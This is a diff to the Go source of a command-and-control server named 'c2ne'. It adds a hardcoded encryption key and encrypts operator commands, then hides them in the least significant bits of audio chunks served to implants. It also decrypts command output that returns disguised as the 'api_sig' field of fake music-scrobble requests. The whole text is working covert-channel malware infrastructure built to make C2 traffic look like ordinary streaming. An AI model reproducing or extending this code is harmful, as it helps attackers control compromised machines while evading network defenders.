@@ -20,8 +20,14 @@ import (
 
 )
 
+var key []byte = []byte{
+    0x2b, 0x7e, 0x15, 0x16,
+    0x28, 0xae, 0xd2, 0xa6,
+    0xab, 0xf7, 0x15, 0x88,
+    0x09, 0xcf, 0x4f, 0x3c,
+}
 const c2_server_ip = "0.0.0.0"
-var firstLoopDone string = "false"
+var firstLoopDone string = "true"
 var (
 	echo_to_stdout string
 	cliMessageChan = make(chan string, 10)
@@ -132,6 +138,10 @@ func handleChunk (w http.ResponseWriter, r *http.Request){
 		case cmd := <-cliMessageChan:
 			command = cmd
 			if len(command) > 0 {
+				command, err = encrypt(key, []byte(command))
+				if err!=nil{
+					fmt.Println("Encryption errored out -", err)
+				}
 				command = "STRT"+command+"STOP"
 			}
 			
@@ -166,38 +176,45 @@ func handleChunk (w http.ResponseWriter, r *http.Request){
 			return
 		}
 label1 :
-
+		commandBytes := []byte(command) //we use this, so go doesnt increase rune size on seeing probable non-utf8 chars in ciphertext
+		/* bitstream not required with the "bitShift bit extraction"
 		var cmd_bitstring []string 
-		for _, char := range command{
+		for _, char := range commandBytes{
 			if echo_to_stdout=="on"{
 				fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
 			}
 			cmd_bitstring = append(cmd_bitstring, fmt.Sprintf("%08b", char))
 		}
+		//fmt.Println("BitStream computed")
+		*/
 		
 		//----code to inject LSB from cmd_bitstring array into audio stream.
-		cmd_bitIndex :=0
-		cmd_charIndex :=0
-		var audio_stegd_bytes []byte
-
 		if echo_to_stdout=="on"{
 			fmt.Println("Chunk length = ", len(chunk))
 			fmt.Printf("Injecting payload (%d characters)...\n", len(command))
 		}
 
+		cmd_bitIndex :=0
+		cmd_charIndex :=0
+		var audio_stegd_bytes []byte
 		for _, aud_byte := range chunk{
-			if cmd_charIndex == len(command) {
+			if cmd_charIndex == len(commandBytes) {
 				if echo_to_stdout=="on"{
 					fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
 				}
 				break
 			}
 
+			/*old logic
 			ival, _ := strconv.Atoi(string(cmd_bitstring[cmd_charIndex][cmd_bitIndex]))
 			aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
 			aud_byte = aud_byte | byte(ival)
+			*/
+			ival := (commandBytes[cmd_charIndex] >> (7 - uint(cmd_bitIndex))) & 1 //bitShift bit extraction
+			aud_byte = (aud_byte & 0xFE) | ival
 
 			audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)
+			//fmt.Println("cmd_bitstring at ", cmd_charIndex, "=", string(byte(cmd_bitstring[cmd_charIndex])))
 
 			cmd_bitIndex++
 			if cmd_bitIndex==8{
@@ -206,6 +223,7 @@ label1 :
 			}
 
 		}
+		//fmt.Println("command encode successful")
 
 		//*********-------------------end------------------*****************//
 		copy(chunk[:cmd_charIndex*8], audio_stegd_bytes[:cmd_charIndex*8])
@@ -259,7 +277,7 @@ type ScrobbleRequest struct{
 	TrackID string `json:"track_id"`
 	PlayedMs string `json:"played_ms"`
 	//DurationMs string `json:"duration_ms"`
-	ApiSig string `json:"api_sig"` //is where the output lies
+	ApiSig []byte `json:"api_sig"` //is where the output lies
 
 }
 
@@ -271,7 +289,13 @@ func handleScrobble(w http.ResponseWriter, r *http.Request){
 		return
 	}
 	defer r.Body.Close()
-	fmt.Println(req.ApiSig)
+	//fmt.Printf("encr scrobbleout %v", []byte(req.ApiSig))
+	output,_ := decrypt(key, req.ApiSig)
+	if rl!=nil{
+		fmt.Fprintln(rl.Stdout(), "decr sc "+output)
+	}else{
+		fmt.Println(output)
+	}
 }
 func decodeEngine (newAudioTrack []byte, size int){
 
@@ -283,11 +307,13 @@ func decodeEngine (newAudioTrack []byte, size int){
 
 	for _, stegd_byte := range(newAudioTrack[:len(newAudioTrack)]){		
 		
+		/*old logic
 		last_bit_str := fmt.Sprintf("%08b", stegd_byte)
 		last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
-		//fmt.Println("stegd_byte = ", stegd_byte, " bitstring = ", last_bit_str, " last bit = ", last_bit_int)
+		*/
 
-		current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)
+		lsb := stegd_byte & 1
+		current_decoded_byte = (current_decoded_byte << 1) | lsb
 
 		op_bitIndex++
 		if op_bitIndex==8{
@@ -305,7 +331,13 @@ func decodeEngine (newAudioTrack []byte, size int){
 				store_output = 0
 				finalOutput := strings.Replace(string(decoded_op_byte), "STOP", "", -1)
 				decoded_op_byte = decoded_op_byte[:0]
-				fmt.Println(finalOutput)
+
+				finalOutput , _ = decrypt(key, []byte(finalOutput))
+				if rl!=nil{
+					fmt.Fprintln(rl.Stdout(), finalOutput)
+				}else{
+					fmt.Println(finalOutput)
+				}
 			}
 			//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
 			op_bitIndex =0
@@ -361,6 +393,7 @@ func main() {
 }
 
 // StartCLIConsole accepts asynchronous text inputs from operators
+var rl *readline.Instance //so that my decoder can print without echoing past commands back
 func StartCLIConsole() {
 	fmt.Println("c2ne is active. Type a command and press Enter")
     rl, err := readline.New("c2ne> ")
